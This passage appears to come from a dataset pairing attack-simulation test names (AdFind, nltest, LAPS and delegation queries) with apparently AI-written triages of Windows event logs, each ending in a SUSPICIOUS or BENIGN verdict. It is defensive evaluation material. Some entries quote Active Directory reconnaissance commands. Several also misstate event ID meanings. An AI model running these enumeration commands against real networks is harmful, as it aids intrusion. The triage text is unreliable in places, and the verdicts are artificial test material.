- The processes initiated by `SERVER002\admin_test` account such as use of `powershell`, `cmd`, and execution of `AdFind.exe` warrant further investigation. While such usage patterns by an admin account might be usual, their occurrence can imply misuse or malicious intent depending on context. The potential misuse of administrative privileges needs to be probed.

- Verify the typical behavior and activities associated with the `SERVER002\admin_test` account to determine if these actions align with normal operations.
- Cross-reference with network logs, user activity logs, or any case-specific intelligence to check for unauthorized access attempts that align with the sequence.
- Check the files in the temporary directory path from where `AdFind.exe` was called for unauthorized or malicious tools/scripts.

**Conclusion:**
Resolution: **SUSPICIOUS**

There are several indicators that suggest potentially anomalous behavior, specifically concerning the use of administrative tools and accounts. Further investigation should be conducted to determine the intent and legitimacy of these activities."
Remote System Discovery - adidnsdump,"Upon analyzing the provided event logs, I noted several activities worth discussing:

1. **PowerShell and Unauthorized Installations**:
   - The PowerShell logs detail a script that downloads Python from an external URL and executes its installer in a silent mode. This action, particularly downloading an executable (python-3.10.4-amd64.exe) and running it silently, is suspicious because it could indicate unwanted software or malicious activity. Typically, authorized installations should be carried out by IT administrators through sanctioned means, not through dynamic scripting.
   - EventRecordID 1114 in the Windows PowerShell log shows a PowerShell command that uses `Invoke-WebRequest` to download a file to a suspicious directory within the user's Temp folder.
   - Following this, multiple installation logs in the Application log (e.g., entries with EventID 11707 and 1033) confirm that Python installations were completed successfully.

2. **Command Execution with Sensitive Arguments**:
   - At EventRecordID 18018 in the Sysmon log, there is a command-line execution involving cmd.exe where it runs a script with what appears to be credentials (""-u domain\\user -p password""). This is suspicious as it suggests handling of sensitive information insecurely in command line operations, potentially exposing credentials.

3. **Frequent Use of `conhost.exe`**:
   - The frequent use of `conhost.exe` linked with command-line tools like PowerShell and cmd.exe in short time intervals might suggest batch processes or scripted activities. While `conhost.exe` itself is not inherently malicious, its use in combination with other factors warrants further investigation in the context of these logs.

4. **Excessive Use of `wevtutil.exe`**:
   - Sysmon showed multiple executions of `wevtutil.exe` by the admin_test user. This utility is used to manage event logs and excessive, or unauthorized usage could indicate an attempt to tamper with event logs or clean up traces of malicious actions.

5. **Python Activity**:
   - Alongside the PowerShell activity, Python installations are confirmed in both the Sysmon and Application logs, indicating a significant amount of Python installation and related activity within a short timespan. This may be benign if known to the IT/Admin staff, but paired with unusual downloads, it raises concerns.

6. **Authentication Events**:
   - Repeated credential access attempts with EventID 5379 and ReturnCode 3221226021 in the Security logs suggest failed attempts at accessing Microsoft accounts or related tokens. Continuous failures hint at brute-forcing attempts or misconfigurations that need attention.

**Assessment**:
The combination of unauthorized file downloads and execution via PowerShell, coupled with sensitive command line operations, prompts concern for potential misuse or compromise of the system. Notably, the downloading and installation of software like Python without clear authorization context suggests a potential breach of security practices.

**Resolution**: SUSPICIOUS

**Guidance**:
- Conduct a thorough audit of systems involved, focusing on unauthorized software installations and the nature of executed scripts.
- Review policies on script executions and ensure PowerShell activities are monitored and regulated.
- Follow up on the user activity for `admin_test` especially concerning the ongoing Python-related operations.
- Implement stronger auditing and logging mechanisms to catch and alert on similar activities more promptly in the future. Consider incorporating proactive threat detection measures to address potential compromise activities early."

   - Multiple executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and other system utilities occurred, all initiated by the `SERVER002\admin_test` user.
   - `cmd.exe` runs the command `netsh advfirewall firewall show rule name=all` which might indicate someone is viewing firewall rules.
   - `wevtutil.exe` and `conhost.exe` are associated with the `admin_test` user, used mainly for viewing or clearing event logs and managing console windows respectively.
   - None of these processes specifically indicates an outright malicious action by themselves but could appear suspicious if not expected or undocumented.

2. **Application Log:**
   - `Windows Defender` is confirmed to be in a secure state as indicated by the entry `SECURITY_PRODUCT_STATE_ON`.

3. **System Logs:**
   - Regular Windows Update activities for Microsoft Defender Antivirus updates are occurring, which is typical for system maintenance.
   - There is nothing suspect or malicious noted in these logs.

4. **Security Logs:**
   - Contains numerous Logon and Account Operations events related to Microsoft Account authentication tokens and failed credential reads, which may represent attempts to connect with Microsoft services.
   - Multiple failed credential retrievals might not necessarily indicate an attack but could be worth additional context about the usage or invalid attempts leading to these errors.
   
5. **Context Consideration:**
   - If these processes (e.g., netsh, wevtutil) are part of routine checks or authorized tasks performed by the `admin_test` user, no immediate action may be required. 
   - If the `admin_test` user did not execute these actions or they fall outside their typical responsibilities, this activity is potentially indicative of unauthorized behavior.

### Assessment:

Upon a comprehensive review of the logs, I find no clear and definitive evidence of *malicious* activities. The events captured appear to align more with system administrative tasks or routine system updates. However, based on the details analyzed:

### Resolution:

**SUSPICIOUS** - While there is no concrete evidence of malicious activity, the regular use of administrative tools like `netsh`, `wevtutil`, and investigative commands like `whoami` might warrant further investigation. These could be routine if the context justifies such activity; otherwise, the frequency and initiation by an admin account could merit an internal review or verification to eliminate any doubts of unauthorized access. 

### Guidance:

1. **Verify with Administrator(s):** Confirm that the usage of tools and command-line utilities was planned administrative action.
   
2. **Monitor User Activity:** Track actions by `admin_test` or other privileged accounts for unusual access or command execution patterns.

3. **Review and Correlate:** Ensure that these events align with scheduled tasks, updates or incident response drills that the IT or Security departments might be executing.

4. **Strengthen User Credentials:** Investigate any failed credential attempts and review password policies or two-factor authentication for the `admin_test` account for any potential unauthorized attempts."
Win32_PnPEntity Hardware Inventory,"Upon reviewing the provided Windows event logs, the following observations were made:

1. **Sysmon Logs**:
   - There are numerous instances of `conhost.exe`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe` executing. While `conhost.exe` is a legitimate Windows process, its association with the execution of `whoami.exe` and `MicrosoftEdgeUpdate.exe` is noteworthy but not necessarily suspicious. It suggests administrative and update-related activities.
   - A Powershell command execution is noted: `powershell.exe & {Get-WMIObject Win32_PnPEntity | ... }`, which writes to a temporary file and sorts the contents. This command is a baseline level of suspicious activity as it involves information gathering and manipulation.
   - The use of `wevtutil.exe`, which is a command line utility designed to retrieve information about event logs and publishers is observed. It’s commonly used for legitimate purposes but can be used by attackers to cover tracks.

2. **PowerShell Logs**:
   - The PowerShell logs confirm the execution of a PowerShell script that retrieves and sorts detailed hardware information using `Get-WMIObject Win32_PnPEntity`. This is unusual for routine administrative tasks and might indicate information gathering, a potential indicator of reconnaissance activity.

3. **System and Security Logs**:
   - The time adjustments made by `svchost.exe` appear in both the system and security logs. Changes in system time can sometimes be a technique used by attackers to mislead time-based security controls or alter event timestamps.

**Analysis**:
- The use of PowerShell to run scripts for gathering system information, when not part of regular administrative activities, is unusual and might be indicative of an intrusion. PowerShell is a common tool for both legitimate and malicious automation, making any unsanctioned use noteworthy, especially for data collection purposes.
- Frequent execution of `conhost.exe` and operations involving `wevtutil.exe` without clear business justification may also signal attempts at information gathering or log tampering.

**Resolution**: SUSPICIOUS

The activity in the logs is suspicious and warrants further investigation. There are signs of potential reconnaissance via PowerShell and possible attempts to manipulate logs or gather system information. It is advised to:
- Investigate the source of the PowerShell commands and verify if they align with planned administrative tasks.
- Review the access logs and cross-reference with legitimate user activities to rule out unauthorized access.
- Increase monitoring of related systems and implement enhanced logging to capture future suspicious activities."
operating system discovery,"Based on the provided Windows event logs, we need to look at each log type for any indicators of suspicious or malicious activity. Let's break down the logs one by one:

### System Log:
- The logs show Kernel-General time change events and Time Service Events, suggesting a time synchronization. The process responsible is `svchost.exe`, which is a legitimate system process often used for various Windows services. 
- Time synchronization events and slight time adjustments are typical and not inherently suspicious on their own unless manipulated for malicious intent, which does not appear to be the case here.

### Windows PowerShell Log:
- These logs capture the start of various providers (Registry, Alias, Environment, etc.) within PowerShell. 
- A PowerShell script was executed: `Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null`. This script is a basic command to gather system information and doesn't exhibit any malicious behavior.

### Security Log:
- Log entries depict time adjustment events, generally consistent with what we see in the System logs. The process `C:\\Windows\\System32\\svchost.exe` and user `LOCAL SERVICE` are typical, showing expected behavior for time synchronization services.

### Sysmon Log:
- Events record execution of processes like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `svchost.exe` by user `admin_test`. 
- The execution of these system utilities in close succession might seem questionable, but their usage in a regular administrative or diagnostic context can be benign, especially given the standard utilities like `hostname.exe` and `whoami.exe`.
- There is a PowerShell process (`powershell.exe`) executing with a command line similar to that in the PowerShell log, aimed at fetching system information—it’s intended to be informative rather than harmful based on the provided command line.

### Application Log:
- The entry from the Software Protection Platform Service (`sppsvc.exe`) indicates typical license verification activity. This action is normal for Windows systems ensuring software integrity and is under the correct `NETWORK SERVICE` context.

### Summary:
Across the different logs, all observed activities align with expected system and administrative operations. There are no clear indicators of process injection, privilege elevation, or unauthorized access attempts. While `whoami.exe` and similar utilities could be used by an attacker to gather system information, they are frequently used legitimately as well. The PowerShell command used is non-destructive and common for user credential verification or routine checks.

### Resolution:
Given the information and lack of any definitive signs of compromise, the resolution for this analysis is:

**BENIGN** - The logs contain typical administrative and system maintenance activities, with no evidence of malicious activity. Continue to monitor the system and incorporate these log reviews into routine checks to ensure any anomalous behavior is promptly identified."
Adfind - Enumerate Active Directory Trusts,"After conducting a thorough examination of the provided event logs, the analysis reveals the following:

### Observations:

1. **Expected System Processes**: 
   - **TiWorker.exe** and **TrustedInstaller.exe** processes are executed by the `NT AUTHORITY\SYSTEM` user. These are part of the legitimate Microsoft Windows Update process.
   - **SecurityHealthService.exe** is executed as part of Windows Security Health services. 

2. **PowerShell Execution**:
   - There was an instance of `powershell.exe` executed by the user `admin_test`. This could be routine, but it often merits further inspection due to PowerShell's utility in executing scripts or commands.

3. **Wevtutil Execution**:
   - Multiple instances of `wevtutil.exe` executed by `admin_test` are noted. While `wevtutil` is a legitimate Windows utility used to manage event logs, frequent execution might imply log tampering or clearing, which can be suspicious.

4. **Command Line Execution**:
   - The execution of `cmd.exe` with a potentially suspicious command line indicates the execution of `AdFind.exe`, a command-line tool used to perform LDAP queries against Active Directory. This tool is often used by attackers for reconnaissance.

5. **Processes and Integrity Levels**:
   - Processes like `hostname.exe`, `whoami.exe`, and `cmd.exe` are executed by `admin_test` at high integrity levels. The use of `hostname.exe` and `whoami.exe` can be used during the reconnaissance phase to gather information about the system environment.

6. **Microsoft Edge Update Processes**: 
   - Multiple processes related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`) are observed running under `NT AUTHORITY\SYSTEM`. These are typical for automatic update mechanisms.

7. **Privilege Escalation**:
   - The Security log (Event ID 4672) shows the `SeDebugPrivilege` and other privileges enabled which is typical for the SYSTEM user.

### Assessment:

The logs contain a mix of typical system activities and some that may warrant additional examination. The frequent usage of utilities like PowerShell and `wevtutil` by a non-standard username (""`admin_test`"") is anomalous and could be indicative of attempts to gather information or manipulate system logs, which commonly align with malicious activities. The command-line execution involving `AdFind.exe` hints at possible Active Directory reconnaissance.

### Final Resolution:

**SUSPICIOUS**

### Guidance:

1. **Further Investigation Recommended**:
   - Examine the user activities associated with ""`admin_test`"", especially the executed PowerShell and command-line processes.
   - Investigate the potential use of `AdFind.exe`, as this could suggest reconnaissance or preparation for lateral movement.
   - Monitor and look for repeated patterns of `wevtutil.exe` usage that may indicate log tampering.

2. **Containment and Monitoring**:
   - Consider more robust monitoring of administrative accounts and high integrity processes.
   - Review and reinforce security controls to ensure only authorized use of powerful scripting tools like PowerShell.

3. **Alert IT/Security Team**:
   - Alert your security operations team to conduct a deeper analysis on the host for any potential undetected compromise or indicators of compromise (IoCs).

Overall, the logs demonstrate benign system functions mixed with unusual activity, indicating it is prudent to dig deeper into the suspicious events for a comprehensive understanding."
Remote System Discovery - nltest,"After analyzing the provided Windows event logs, here's a detailed breakdown of the findings:

### Application Logs:
- **EventID 15**: Indicates that Windows Defender security product is operational and active. This is a benign entry reporting the operational status of the security product.

### Security Logs:
- **EventID 5379**: Multiple entries with ReturnCode 3221226021 indicating a failed credential access attempt. This code corresponds to “A device attached to the system is not functioning.” The persistent failure without variation could suggest either a misconfiguration or a systematic attempt at credential access that is unsuccessful.

- **EventID 4624**: Successful logon by the SYSTEM account. The logon type 5 indicates a service-type logon. This behavior is normal for services starting or executing operations under the SYSTEM account.

- **EventID 4672**: Privilege assignment to the SYSTEM account, which includes SeDebugPrivilege among others. While these privileges are extensive, they are typical for the SYSTEM user in a Windows environment unless combined with unexpected actions elsewhere.

### System Logs:
- **EventID 44, 43, 19**: These entries indicate successful Windows Update operations for Microsoft Defender Antivirus. They appear to be typical system maintenance activities.

### Sysmon Logs:
- **EventID 1**: Multiple entries showing the execution of system utilities like cmd.exe, whoami.exe, nltest.exe, among others, running with high integrity level by the user ""SERVER002\\admin_test"" within a short timeframe. This could indicate a script or operation conducting reconnaissance or a system check routine.

- **EventID 5**: Several entries showing launch of known system executables by ""SERVER002\\admin_test"". Running these utilities is not inherently suspicious unless correlated with other unusual activities.

### Overall Assessment:
The logs show significant regular system activity and updates, conducted under NT AUTHORITY\SYSTEM which is typical for maintenance operations on a server. There is a pattern of repeated credential access failure with EventID 5379, but it is important to note the consistent failure, indicating no successful unauthorized access was made.

### Conclusion:
- **Benign Activities**: Security updates and system maintenance processes appear to be operating normally. The presence of utilities like wuauclt.exe (Windows Update), CompatTelRunner.exe (Compatibility Telemetry) among others suggests normal operations.

- **Suspicious Activity Indicators**: The repeated EventID 5379 suggests potentially unauthorized attempts at credential access or possible misconfigurations.
  
### Recommended Actions:
1. Investigate the cause of the EventID 5379 failures. Determine if they are benign (due to device issues or failed automation) or if they suggest an attempted unauthorized access.
2. Double-check the user ""SERVER002\\admin_test"" and associated tasks for suspicious behavior or any deviations that do not align with regular administrative activity.

### Final Resolution:
- **SUSPICIOUS** - The repeated credential failure EventID 5379 warrants further investigation to ensure that there is no misconfiguration or attempted unauthorized access. The rest of the activity, while extensive, appears routine for system maintenance."
GetCurrent User with PowerShell Script,"### Detailed Analysis:

- **Security Logs:**
  - **Event ID 4624 (Logon Event):**
    - A logon event with Logon Type 5 indicates a service logon. It’s normal for `services.exe` to authenticate using the SYSTEM account. However, the use of the SYSTEM account is something to be aware of as it could potentially be exploited in privilege escalation attacks if services are misconfigured.
  - **Event ID 4672 (Special Privileges):**
    - The SYSTEM account received multiple high privilege rights (such as `SeDebugPrivilege`) typical for the SYSTEM account. While usual for legitimate services, monitoring for potential abuse is recommended.
  - **Event ID 5379 (Credential Validation):**
    - Numerous logs indicate failed attempts to use Microsoft and Windows Live accounts with return code `3221226021`, which is a common ""Logon failure"" code. Such failures could indicate a brute force or spraying attack attempt.

- **System Logs:**
  - Standard entries related to system updates and registry changes were observed. No signs of tampering or anomalies were present. The Windows Update logs reflect normal operations, such as updating Defender definitions.

- **PowerShell Logs:**
  - PowerShell commands were executed to get current user information and save it to a file (`CurrentUserObject.txt`). The command itself is harmless by itself, but if not part of normal operations, it could point to reconnaissance activities by an attacker.

- **Sysmon Logs:**
  - **Event ID 5 (Process Access):** 
    - Observed multiple instances of `wevtutil.exe` and `conhost.exe` by `admin_test` user. `wevtutil.exe` is often used for legitimate purposes, such as exporting event logs. If unexpected, it could indicate log tampering attempts.
  - **Event ID 1 (Process Creation):**
    - Several legitimate process executions noted (`svchost.exe`, `wuauclt.exe`, etc.) associated with Windows operations. No unusual paths or unexpected command-line parameters seen.
  - **PowerShell Execution:**
    - Execution of `powershell.exe` with minimal command indicating a retrieval of user identity, potentially benign but needs correlation with operational context on this host.

### Assessment:

Based on the analysis:
- The **failed credential access attempts** (Event ID 5379) are **SUSPICIOUS** and could suggest unauthorized access attempts.
- The **PowerShell command** execution that captures user details might be **SUSPICIOUS** unless confirmed as part of legitimate administrative activities.
- Usage of `wevtutil.exe` for exporting logs requires context; while occasionally benign, out-of-context usage might suggest **SUSPICIOUS** activity, such as log modification or export by an unauthorized user.

### Guidance:

1. **Investigate the source of the failed credential attempts** and the involved user identity (`02txoixylodcstop`). Determine if these are expected or tie them to unauthorized access attempts.
2. **Review the context of PowerShell executions:** Confirm if the out-file storing user object is standard policy for admins or part of a larger attack scenario.
3. **Assess wevtutil.exe usage:** Verify if the logs were intended for export by `admin_test` or if this indicates log tampering attempts.
4. **Implement stricter logging and monitoring policies** to capture more context (e.g., command-line arguments) surrounding potential suspicious activities.

### Resolution:

Given the identified risks and potential indicators of compromise, this investigation concludes with a resolution of **SUSPICIOUS**. Further examination and correlation with known threats, user behavior, and asset management logs is necessary to rule out potential threats."
Adfind - Enumerate Active Directory Exchange AD Objects,"After analyzing the provided Windows event logs, several points need to be highlighted:

1. **Repeated Logon Activity (Event ID 4624)**: There are multiple entries indicating successful logins with LogonType 5, which signifies a service logon. This logon type is typical for services and doesn't typically indicate suspicious activity when associated with SYSTEM or service accounts, as is seen here.

2. **Privileged Use (Event ID 4672)**: The events indicate elevated privileges including `SeDebugPrivilege` and others, which are commonly seen with SYSTEM processes. While these privileges are sensitive, they are typical for SYSTEM and critical system processes.

3. **Rundll32 and Other Windows Executables**: The logs show various process creations involving typical Windows executables like `rundll32.exe`, `cmd.exe`, and `whoami.exe`. The usage of these commands alone isn't necessarily malicious, but their combination with uncommon commands or network access might indicate malicious use. In this case, the command line appears to execute legitimate internal tasks, such as running `AdFind.exe`.

4. **Concerning Command Execution**: One specific log entry using `cmd.exe` indicates execution of `AdFind.exe` to search the directory (via command ""exchaddresses""). While `AdFind.exe` is a legitimate administrative tool used for directory queries, its use in this context could be suspicious if performed on a server where it is not usually executed, particularly if the `admin_test` user context is unexpected.

5. **Service Manipulation (Event ID 4798)**: Events related to services being queried (`wevtutil.exe`) are recorded under the context of `admin_test`, suggesting a user with administrative privileges is inspecting event logs. This ingress and egress could be legitimate system checks but also raise a flag for potential unauthorized internal recon activity if `admin_test` isn't formally authorized for such queries.

6. **Indicators of Potential Reconnaissance**: Commands and tools (such as `AdFind`) used on the server can be part of reconnaissance before a more significant attack if they don’t align with regular administrative task profiles.

**Assessment**:
- Evidence here doesn’t definitively confirm malicious activity but raises concerns primarily related to the execution of directory querying tools and potential reconnaissance activities under unconventional or infrequent user context. 

**Resolution**:
- **SUSPICIOUS -** The activities do not align clearly with typical benign server tasks and may warrant further investigation. Verify the legitimacy of the `admin_test` user and the use of `AdFind.exe`. It's important to review account usage patterns and network activity around these events to determine if they align with expected administrative behavior or indicate unauthorized probing.

**Next Steps**:
- Investigate if the `admin_test` account should have access to run the observed tools and processes.
- Determine if `AdFind.exe` execution was part of a routine administrative task or unexpected.
- Cross-reference with other network logs or alert systems to identify if this activity can be correlated with known threats or suspicious network patterns.
- Engage with the user or team associated with the `admin_test` account to confirm recent activities match recorded logs."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"Upon reviewing the provided logs, here’s the detailed analysis:

### Indicators of Potentially Suspicious Activity:

1. **Frequent Execution of System Utilities**: 
   - A pattern of Sysmon events (EventID 5) shows multiple executions of `wevtutil.exe` and `conhost.exe`. These are standard Windows utilities typically used for legitimate purposes such as reading or writing to Windows Event Logs or managing console windows. However, repeated executions in quick succession, especially by the same user (`admin_test`), may indicate an attempt to alter or clear event logs to hide malicious activity. 

2. **PowerShell Usage**:
   - An instance of PowerShell was executed (`powershell.exe & {script $env:computername -Properties *}`), which did not include a detailed script or command. Without specific command details, this could be benign or indicative of reconnaissance behavior, such as gathering host information. The lack of detailed context makes it challenging to immediately classify, warranting further investigation to ensure it is not used for malicious scripting.

3. **User Environment with High Privilege Level**:
   - The integrity level is consistently high for processes executed by `SERVER002\admin_test`, hinting at operations being performed with administrative privileges. High integrity is often necessary for administrative tasks, but also what attackers often seek for privilege escalation purposes.

4. **Execution of Service Update and Installation Processes**:
   - Numerous instances of Microsoft’s EdgeUpdate processes and related activities are noted, including processes executed from temporary directories. While normally part of automatic updates, the temporary directory usage (`EUE4C8.tmp`) and frequent service-related command executions can be exploited for privilege escalation or command execution by malicious actors. Investigating the legitimacy of these updates is essential.

5. **Host and User Information Queries**:
   - Commands such as executing `hostname.exe` and `whoami.exe` to gather system information are common from red-team activities or initial stages of an attack to map the environment.

### Conclusion:

Given the activities described, the findings can be categorized as **SUSPICIOUS**. While these actions may not independently confirm malicious activity outright, they share characteristics common in suspicious behavior patterns that require further analysis:

- **Next Steps for Investigation**:
  - Verify the legitimacy of tasks executed by `wevtutil.exe` and `conhost.exe`, ensuring they correlate with expected administrative actions.
  - Investigate the PowerShell commands executed by `SERVER002\admin_test` to understand their purpose and origin.
  - Validate the `EdgeUpdate` activities to ensure they align with legitimate update processes and are not exploited for malicious purposes.
  - Monitor and limit the use of high-privileged accounts like `admin_test` to necessary operations, implementing tighter security controls if needed.
  - Check system or network logs for any unauthorized access or anomaly that coincides with timeline entries from these logs.

This comprehensive review suggests that while there are no clear indicators of a confirmed breach, several events require more context and validation to rule out any underlying threats."
Suspicious LAPS Attributes Query with adfind all properties,"Based on the analysis of the provided logs, let's identify the key findings:

1. **Process Execution Patterns**:
   - **wevtutil.exe** and **conhost.exe** executions:
     - These are standard Windows utilities. Wevtutil is typically used to interface with Windows Event Logs, and conhost.exe is associated with console applications. The execution instances for these are repeated and may suggest legitimate log management activities or investigations.
   - **HOSTNAME.EXE** and **whoami.exe** executions:
     - These are benign utilities used to fetch the machine's hostname and the current logged user, respectively. The frequent execution of these tools by ""admin_test"" may signify an operator checking the system environment or service status.
   
2. **PowerShell Activity**:
   - Execution of a PowerShell command involving ""AdFind.exe"":
     - The use of PowerShell to execute AdFind suggests directory reconnaissance activity, which can be legally used for legitimate directory queries or potentially for reconnaissance by an attacker.
     - The execution command is: `""powershell.exe"" & {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe\"" -h $env:USERDOMAIN -s subtree -f \""objectclass=computer\"" *}`
     - This is a specific enumeration attempt of directory objects, which could be part of a routine audit or an initial stage of unauthorized network probing, depending on the context.

3. **Time Changes in System and Security Logs**:
   - The logs show several events where the system time was adjusted (`EventID: 4616` in the Security logs and similar Kernel-General entries). This could be indicative of time synchronization events or attempts to obfuscate activities by altering timestamps.

4. **Execution of Windows System Services**:
   - The logs display routine executions of processes like **svchost.exe**, **WmiPrvSE.exe**, **sppsvc.exe**, and service processes related to Microsoft updates. These entries appear normal and show system tasks being executed, likely related to system services operations.

**Assessment**:
- **SUSPICIOUS**: The PowerShell activity involving AdFind.exe suggests a need for deeper investigation. While AdFind is a legitimate utility, it is commonly associated with intrusions and reconnaissance activities within a network context. The context—location in non-standard directories and coupling with PowerShell—warrants further scrutiny to determine intent and legitimacy.

**Guidance**:
- Investigate the intent behind AdFind.exe usage. Verify if this action aligns with regular administrative tasks or could be an indicator of compromise.
- Correlate this activity with other network behavior, user activity logs, and any incident response platform entries.
- Consider the use of network or endpoint detection solutions to monitor for similar activities and set alerts for unusual patterns.

**Resolution**: SUSPICIOUS"
Enumerate Active Directory for Unconstrained Delegation,"In analyzing these logs, the notable entries come from the Windows PowerShell and Microsoft-Windows-Sysmon logs. Below is the detailed analysis:

### Windows PowerShell Logs

1. **PowerShell Command Execution**:
   - The command executed: `powershell.exe {Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain}`
   - This PowerShell script is querying Active Directory for objects with a `UserAccountControl` value that indicates that they have the ""trusted for delegation"" flag set (value 524288).
   - This type of query is commonly associated with reconnaissance activities, potentially part of an enumeration stage in a penetration test or attack that seeks to identify which accounts have elevated privileges or significant roles within an infrastructure.

### Sysmon Logs

2. **Process Execution Details**:
   - Several instances of `powershell.exe` are launched by the user `SERVER002\admin_test`, indicating scripted or automated activity.
   - The `wermgr.exe`, `conhost.exe`, `wevtutil.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and `MicrosoftEdgeUpdate.exe` processes running at frequent intervals do not immediately appear as malicious, as these align with legitimate process names. However, the frequent launching and their connections to PowerShell activities may suggest automated or batch operations.
   - The `whoami.exe` and `HOSTNAME.EXE` processes are noted, commonly used for system recon to enumerate the current user and hostname, respectively, which can be part of a malicious script or an administrative operation.

3. **Unusual Edge Update Activity**:
   - Numerous entries for `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, suggesting an update or installation process. The command-line seen does not hold any immediate red flags, but the frequent execution could be anomalous unless correlated with legitimate Edge updates.

### Conclusion

The logs present behaviors that could be deemed as reconnaissance or indications of a batch processing script:
- The enumeration of AD objects with a PowerShell command suggests potentially suspicious activity.
- The presence of several high-integrity processes being executed frequently elevates the suspicion factor, especially under an administrative account.

### Assessment

Based on the analysis, the following resolution is suggested:

- **Resolution**: SUSPICIOUS

### Recommendations

1. **Open Investigation**:
   - Further investigate the `powershell.exe` command to identify if this was an intended administrative action or unauthorized usage.
   - Validate whether the `MicrosoftEdgeUpdate.exe` operation aligns with a legitimate update schedule or distribution in the environment.

2. **Monitor User Accounts**:
   - Review actions taken by the `SERVER002\admin_test` account to ensure its legitimacy and that no credentials have been compromised.

3. **Audit AD Logs**:
   - Check additional AD logs, if possible, to correlate the PowerShell script’s use and any changes associated with the queried accounts.

Following these steps may provide clarity on whether this activity escalates from suspicious to malicious or if it can be safely categorized as benign due to routine administrative action."
Discover System Language by Windows API Query,"Upon analyzing the provided Windows event logs, here are the key findings:

1. **Security Log Events:**
   - **EventID 4624** (An account was successfully logged on): Multiple instances of logon activity with LogonType 5 (service logon) was observed for the user SYSTEM. This is generally standard behavior for service accounts and does not directly indicate malicious activity.
   - **EventID 4672** (Special privileges assigned): These events indicate the assignment of special privileges such as ""SeDebugPrivilege"" to the SYSTEM account. This is standard for the SYSTEM account and is not necessarily a cause for concern.
   - **EventID 5379**: Multiple entries are trying to read operations using a credential manager on potentially Microsoft Account related objects and consistently returning 3221226021, indicative of an authentication operation failure or access denial, though this requires further context.
   - **EventID 4798** (A user's local group membership was enumerated): The occurrences of this event indicate that a process has queried the group membership information for many users (Administrator, admin_test, DefaultAccount, Guest, lplui). This could be suspicious if it aligns with unauthorized enumeration attempts.

2. **Sysmon Log Events:**
   - **EventID 1 (Process Creation)** shows processes like `whoami.exe`, `cmd.exe`, and others that can be relevant for enumeration. While the command-line arguments show typical system usage, the path for `LanguageKeyboardLayout.exe` in a temporary folder could be unusual and suggest potentially unwanted activity.
   - **EventID 5 (Process Termination)** follows process termination events of standard Windows utilities such as `wevtutil.exe` and `conhost.exe`. Multiple instances are associated with the user ""admin_test"", which raises a potential flag if this is a privileged user and is unusual for routine operations.

3. **Assessment and Conclusion:**
   - The logs demonstrate a pattern of heightened querying of local user accounts and frequent service account activity. Processes being executed from temporary folders can be indicative of suspicious activity, suggesting possible lateral movement or enumeration attempts.
   - The failure in retrieving credentials from Microsoft Account operations could suggest benign credential sync issues, but when combined with enumeration attempts, it can point towards potential probing of user profiles.

**Resolution:** SUSPICIOUS

**Guidance on Proceeding:**
- Conduct a deeper investigation using endpoint detection solutions to verify any anomalous activities on the user ""admin_test"".
- Review any recent changes or deployments related to the account ""admin_test"" and validate whether the use of temporary folder executables is standard.
- Confirm whether the enumeration of user group information is part of a legitimate administrative task or indicative of reconnaissance activity.
- Follow up with network traffic analysis to cross-verify these events align with any external communications or unauthorized access attempts."
Detect a Debugger Presence in the Machine,"Based on the provided Windows event logs, here's a detailed analysis of the activities observed:

**System Log Analysis:**
- The system logs include Windows Time Service events, which indicate the system time being adjusted. Time adjustments by themselves aren't necessarily suspicious, but should be further correlated with other events for any anomalies.
- The time change events (`EventID 24` and `EventID 1`) appear to be routine adjustments and are associated with `svchost.exe`, a legitimate Windows service host process, typically related to time synchronization.

**Windows PowerShell Log Analysis:**
- The PowerShell log events mainly show the starting of different PowerShell providers and an event related to examining processes for debugging tools (matching `dbg` or `debug`). This could suggest an administrator or script checking for debuggers on the system, which might be routine in some scenarios, but the lack of indication of a specific purpose or authorization context makes this noteworthy.

**Security Log Analysis:**
- Event `4616` indicates a change in system time, which matches the System logs for time adjustment. There's no indication of malicious behavior directly tied to these time change logs.
- Event `4672` indicates special privileges assigned to the user `admin_test`, which include sensitive privileges like `SeDebugPrivilege`. This is concerning because these privileges can allow extensive access and control over the system. The presence of such privileges suggests a high level of trust or potential for misuse if the account was compromised.
- Event `4634` and `4624` show logon and logoff events related with user `admin_test`. The logon was initiated with NTLM authentication, which is typical, but should be verified if it correlates with expected remote activities or scheduled tasks.

**Sysmon Log Analysis:**
- Numerous events from `Sysmon` show process creations and terminations involving legitimate processes like `MicrosoftEdgeUpdate` and various system processes (`wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`). The presence of `wsmprovhost.exe` as a parent for several processes hints at potential PowerShell activity, likely tied to the aforementioned PowerShell logs.
- No direct indicators of malware were identified in the hash values, command lines, or parent-child process relationships, yet `PowerShell` activity and high privilege usage should always be scrutinized.
- The frequent execution of wevtutil, conhost, and other processes in close succession may indicate automated scripts or administrative tasks being executed.

**Application Log Analysis:**
- Logs indicate standard operations by `Microsoft Edge Update`. There's nothing overtly suspicious within these logs related to application compromises.

### Conclusion:
**SUSPICIOUS** 

- The presence of high privileges such as `SeDebugPrivilege` assigned to `admin_test` and the use of PowerShell for potentially unnecessary checks stand out as areas needing closer examination.
- No conclusive evidence of explicit malicious activity was found, like known malware hashes or typical indicators of compromise. However, the combination of high privilege escalation and PowerShell usage requires further investigation to determine the legitimacy of these actions. Additionally, verifying how and why such privileges are granted will be crucial in ensuring system integrity.

### Recommendations:
1. **Review Recent Administration Changes**: Confirm if these events align with recent administrative tasks, scripts, or configurations applied intentionally to the system.
2. **Privilege Audit**: Conduct a thorough audit of user `admin_test` activities and ensure that the assignment and use of high privileges like `SeDebugPrivilege` are justified.
3. **PowerShell Script Analysis**: Examine any PowerShell scripts or administration tasks executed around these event timestamps to ensure no unauthorized or suspicious activities were performed.
4. **Continuous Monitoring**: Implement enhanced monitoring temporarily on this system to catch any further anomalies and pivot accordingly for an in-depth investigation."
User Discovery With Env Vars PowerShell Script,"Upon the assessment of the provided Windows event logs, the following observations and analysis are made:

